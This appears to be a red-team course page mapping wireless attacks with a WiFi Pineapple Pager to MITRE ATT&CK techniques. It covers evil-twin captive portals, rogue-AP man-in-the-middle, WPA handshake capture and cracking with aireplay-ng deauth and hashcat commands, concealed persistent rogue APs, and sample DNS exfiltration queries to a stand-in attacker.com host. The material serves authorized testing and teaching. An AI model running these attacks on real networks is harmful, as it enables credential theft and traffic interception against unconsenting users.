# Red Team Tactics - WiFi Pineapple Pager

## Overview

This section covers MITRE ATT&CK-mapped techniques for wireless network attacks using the WiFi Pineapple Pager. These tactics are for authorized red team operations and penetration testing only.

---

## Reconnaissance Tactics

### T1595 - Active Scanning

```
┌─────────────────────────────────────────────────────────────────────┐
│ TECHNIQUE: WiFi Environment Enumeration                              │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ GOAL: Map the wireless infrastructure                               │
│                                                                      │
│ METHODS:                                                             │
│ ├── Passive scanning (probe capture)                                │
│ │   airodump-ng wlan1 -w capture                                    │
│ │                                                                    │
│ ├── Active scanning (beacon collection)                             │
│ │   Collect SSID, BSSID, channel, encryption                        │
│ │                                                                    │
│ └── Targeted probing                                                │
│     Focus on specific networks of interest                          │
│                                                                      │
│ INTELLIGENCE GATHERED:                                               │
│ ├── Network names (SSIDs)                                           │
│ ├── Access point MAC addresses (BSSIDs)                             │
│ ├── Channel distribution                                            │
│ ├── Encryption types (WPA2, WPA3, Open)                             │
│ ├── Client associations                                             │
│ └── Hidden network detection                                        │
│                                                                      │
│ PAYLOAD: PP-B02_Network_Scanner.sh                                  │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### T1592 - Gather Victim Host Information

```
┌─────────────────────────────────────────────────────────────────────┐
│ TECHNIQUE: Client Device Fingerprinting                              │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ DATA COLLECTED:                                                      │
│ ├── Client MAC addresses                                            │
│ │   OUI lookup for manufacturer identification                      │
│ │                                                                    │
│ ├── Probe requests                                                  │
│ │   SSIDs device is searching for                                   │
│ │   Reveals previously connected networks                           │
│ │                                                                    │
│ └── Connection patterns                                             │
│     Device behavior and timing                                      │
│                                                                      │
│ ANALYSIS CAPABILITIES:                                               │
│ ├── Identify device types (phone, laptop, IoT)                      │
│ ├── Determine user mobility patterns                                │
│ ├── Find target devices by behavior                                 │
│ └── Map corporate vs personal devices                               │
│                                                                      │
│ PAYLOAD: PP-I04_Probe_Capture.sh                                    │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Initial Access Tactics

### T1189 - Drive-by Compromise (Wireless)

```
┌─────────────────────────────────────────────────────────────────────┐
│ TECHNIQUE: Evil Twin with Captive Portal                            │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ ATTACK FLOW:                                                         │
│                                                                      │
│  1. Identify target network SSID                                    │
│     └── airodump-ng scan                                            │
│                                                                      │
│  2. Create matching rogue AP                                        │
│     └── hostapd configuration with same SSID                        │
│                                                                      │
│  3. Deauth clients from legitimate AP                               │
│     └── aireplay-ng -0 5 -a BSSID wlan1                             │
│                                                                      │
│  4. Clients reconnect to stronger signal (rogue AP)                 │
│     └── Evil twin has higher power output                           │
│                                                                      │
│  5. Present captive portal                                          │
│     └── Credential harvesting page                                  │
│                                                                      │
│  6. Capture credentials                                             │
│     └── Log to file, forward to C2                                  │
│                                                                      │
│ PORTAL TYPES:                                                        │
│ ├── Corporate login page clone                                      │
│ ├── WiFi password re-entry                                          │
│ ├── Terms and conditions with credential fields                     │
│ └── Fake software update page                                       │
│                                                                      │
│ PAYLOAD: PP-A03_Evil_Twin.sh                                        │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### T1133 - External Remote Services

```
┌─────────────────────────────────────────────────────────────────────┐
│ TECHNIQUE: Rogue AP with Internet Access                            │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ SETUP:                                                               │
│ ├── Create open or WPA2 access point                                │
│ ├── Provide internet connectivity                                   │
│ ├── Configure transparent proxy                                     │
│ └── Enable traffic interception                                     │
│                                                                      │
│ MAN-IN-THE-MIDDLE CAPABILITIES:                                      │
│ ├── HTTP traffic inspection                                         │
│ ├── DNS manipulation                                                │
│ ├── SSL stripping (where possible)                                  │
│ ├── Credential capture                                              │
│ └── Session hijacking                                               │
│                                                                      │
│ DEPLOYMENT SCENARIOS:                                                │
│ ├── Coffee shop / public wifi replacement                           │
│ ├── Hotel network impersonation                                     │
│ ├── Conference/trade show                                           │
│ └── Corporate guest network clone                                   │
│                                                                      │
│ PAYLOAD: PP-I08_Rogue_AP.sh                                         │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Credential Access Tactics

### T1110 - Brute Force (WPA Cracking)

```
┌─────────────────────────────────────────────────────────────────────┐
│ TECHNIQUE: WPA Handshake Capture and Cracking                        │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ PHASE 1: CAPTURE                                                     │
│ ├── Monitor target network                                          │
│ │   airodump-ng -c [channel] --bssid [bssid] -w capture wlan1       │
│ │                                                                    │
│ ├── Force client deauthentication                                   │
│ │   aireplay-ng -0 5 -a [bssid] -c [client] wlan1                   │
│ │                                                                    │
│ └── Capture 4-way handshake                                         │
│     WPA handshake appears in airodump-ng                            │
│                                                                      │
│ PHASE 2: OFFLINE CRACKING                                            │
│ ├── Wordlist attack                                                 │
│ │   hashcat -m 22000 capture.hc22000 wordlist.txt                   │
│ │                                                                    │
│ ├── Rule-based attack                                               │
│ │   hashcat -m 22000 capture.hc22000 wordlist.txt -r rules.rule     │
│ │                                                                    │
│ └── GPU-accelerated brute force                                     │
│     For short passwords                                              │
│                                                                      │
│ SUCCESS FACTORS:                                                     │
│ ├── Quality of wordlist                                             │
│ ├── Password complexity                                             │
│ ├── Computing power available                                       │
│ └── Time available                                                  │
│                                                                      │
│ PAYLOAD: PP-I05_Handshake_Capture.sh                                │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### T1557 - Adversary-in-the-Middle

```
┌─────────────────────────────────────────────────────────────────────┐
│ TECHNIQUE: Traffic Interception                                      │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ SSL STRIPPING:                                                       │
│ ├── Intercept HTTPS downgrade to HTTP                               │
│ ├── Capture credentials in cleartext                                │
│ ├── Tool: sslstrip, mitmproxy                                       │
│ └── Less effective with HSTS                                        │
│                                                                      │
│ HTTP CREDENTIAL INTERCEPTION:                                        │
│ ├── Capture form submissions                                        │
│ ├── Extract cookies and sessions                                    │
│ ├── Log all HTTP traffic                                            │
│ └── Tool: bettercap, ettercap                                       │
│                                                                      │
│ DNS SPOOFING:                                                        │
│ ├── Redirect domains to attacker server                             │
│ ├── Serve phishing pages                                            │
│ ├── Capture credentials                                             │
│ └── Tool: dnsspoof, bettercap                                       │
│                                                                      │
│ PAYLOAD: PP-A04_MITM_Suite.sh                                       │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Persistence Tactics

### Rogue Infrastructure

```
┌─────────────────────────────────────────────────────────────────────┐
│ TECHNIQUE: Long-term Rogue AP Deployment                             │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ GOAL: Establish persistent credential harvesting                    │
│                                                                      │
│ DISGUISE METHODS:                                                    │
│ ├── Match corporate SSID exactly                                    │
│ ├── Use similar encryption (WPA2-Enterprise clone)                  │
│ ├── Position for better signal than legitimate AP                   │
│ └── Operate during off-hours for initial capture                    │
│                                                                      │
│ CAPABILITIES:                                                        │
│ ├── Continuous credential harvesting                                │
│ ├── Traffic monitoring and logging                                  │
│ ├── Scheduled exfiltration                                          │
│ └── Remote management via C2                                        │
│                                                                      │
│ OPERATIONAL CONSIDERATIONS:                                          │
│ ├── Power requirements (battery vs outlet)                          │
│ ├── Physical concealment                                            │
│ ├── Detection avoidance                                             │
│ └── Data exfiltration schedule                                      │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Exfiltration Tactics

### T1048 - Exfiltration Over Alternative Protocol

```
┌─────────────────────────────────────────────────────────────────────┐
│ TECHNIQUE: DNS Exfiltration                                          │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ METHOD:                                                              │
│ ├── Encode captured data as Base64                                  │
│ ├── Chunk into DNS-safe segments (< 63 chars per label)             │
│ ├── Send as subdomain queries                                       │
│ └── Controlled DNS server reassembles                               │
│                                                                      │
│ EXAMPLE:                                                             │
│ dXNlcm5hbWU9.chunk1.exfil.attacker.com                              │
│ YWRtaW4mcGE=.chunk2.exfil.attacker.com                              │
│ c3M9MTIzNA==.chunk3.exfil.attacker.com                              │
│                                                                      │
│ ADVANTAGES:                                                          │
│ ├── DNS usually allowed outbound                                    │
│ ├── Hard to detect in high-volume networks                          │
│ ├── Works through most firewalls                                    │
│ └── No direct connection to C2                                      │
│                                                                      │
│ IMPLEMENTATION:                                                      │
│ ├── Pager collects credentials                                      │
│ ├── Chunks and encodes data                                         │
│ ├── Makes DNS queries periodically                                  │
│ └── Receiver decodes and stores                                     │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Attack Chain Examples

### Credential Harvesting Chain

```
RECON → INITIAL ACCESS → CREDENTIAL ACCESS → EXFIL

1. Network scanning (T1595)
   └── Identify target SSID and channel

2. Evil Twin deployment (T1189)
   └── Create matching rogue AP

3. Client deauthentication
   └── Force reconnection to evil twin

4. Captive portal presentation
   └── Harvest WiFi password

5. Data exfiltration (T1048)
   └── Send credentials to C2

Timeline: 5-30 minutes
```

### Man-in-the-Middle Chain

```
INITIAL ACCESS → MITM → COLLECTION → EXFIL

1. Rogue AP deployment (T1133)
   └── Create open AP with internet

2. Wait for client connections
   └── Provide legitimate internet service

3. Traffic interception (T1557)
   └── SSL strip, credential capture

4. Credential logging
   └── Store captured data

5. Exfiltration
   └── Transfer logs to C2

Timeline: Continuous operation
```

### WPA Cracking Chain

```
RECON → CAPTURE → OFFLINE ATTACK

1. Network identification (T1595)
   └── Find target WPA2 network

2. Client enumeration
   └── Identify connected devices

3. Handshake capture (T1110)
   └── Deauth and capture 4-way handshake

4. Offline cracking
   └── GPU-accelerated wordlist attack

5. Network access
   └── Connect with recovered password

Timeline: Capture (5 min), Cracking (varies)
```

---

## Quick Reference

```
┌─────────────────────────────────────────────────────────────────────┐
│                 PP RED TEAM TACTICS QUICK REFERENCE                  │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  RECONNAISSANCE:                                                     │
│  ├── T1595 - Active Scanning (WiFi enumeration)                     │
│  └── T1592 - Gather Host Info (client fingerprinting)               │
│                                                                      │
│  INITIAL ACCESS:                                                     │
│  ├── T1189 - Drive-by Compromise (Evil Twin)                        │
│  └── T1133 - External Remote Services (Rogue AP)                    │
│                                                                      │
│  CREDENTIAL ACCESS:                                                  │
│  ├── T1110 - Brute Force (WPA cracking)                             │
│  └── T1557 - Adversary-in-the-Middle (SSL strip)                    │
│                                                                      │
│  PERSISTENCE:                                                        │
│  └── Long-term rogue infrastructure                                 │
│                                                                      │
│  EXFILTRATION:                                                       │
│  └── T1048 - Alternative Protocol (DNS exfil)                       │
│                                                                      │
│  KEY TOOLS:                                                          │
│  ├── aircrack-ng suite (capture, deauth)                            │
│  ├── hostapd (rogue AP)                                             │
│  ├── bettercap (MITM)                                               │
│  └── hashcat (offline cracking)                                     │
│                                                                      │
│  ALWAYS REQUIRED:                                                    │
│  ├── Written authorization                                          │
│  ├── Defined scope (target networks only)                           │
│  └── Rules of engagement                                            │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

---

[← Advanced Payloads](../04_Advanced_Payloads/) | [Back to Pineapple Pager](../README.md) | [Next: Blue Team Countermeasures →](../06_Blue_Team_Countermeasures/)
